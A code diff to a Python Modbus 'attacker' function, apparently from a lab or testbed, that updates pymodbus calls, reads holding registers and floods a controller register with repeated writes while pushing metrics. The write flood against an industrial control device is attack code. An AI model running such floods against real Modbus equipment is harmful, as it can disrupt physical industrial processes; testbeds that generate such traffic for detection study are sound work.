@@ -42,8 +42,7 @@ def run_modbus_attacker():
         start_time = time.time()
         try:
             # Đọc 100 thanh ghi từ địa chỉ 0
-            # Lưu ý: pymodbus 3.x dùng slave=1
-            result = client.read_holding_registers(address=0, count=100, slave=1)
+            result = client.read_holding_registers(address=0, count=99, device_id=1)
             
             if result.isError():
                 print(f" Lỗi khi đọc thanh ghi: {result}")
@@ -62,11 +61,11 @@ def run_modbus_attacker():
         
         for i in range(100):
             try:
-                res = client.write_register(0, 99, slave=1)
+                res = client.write_register(0, 99, device_id=1)
                 if not res.isError():
                     success_count += 1
                     # Ghi nhận metric tần suất cao
-                    push_metric("attack_write_flood", 99)
+                    push_metric("write", 99)
                 
                 # Sleep cực ngắn để tạo lưu lượng cao (flood)
                 time.sleep(0.05) 
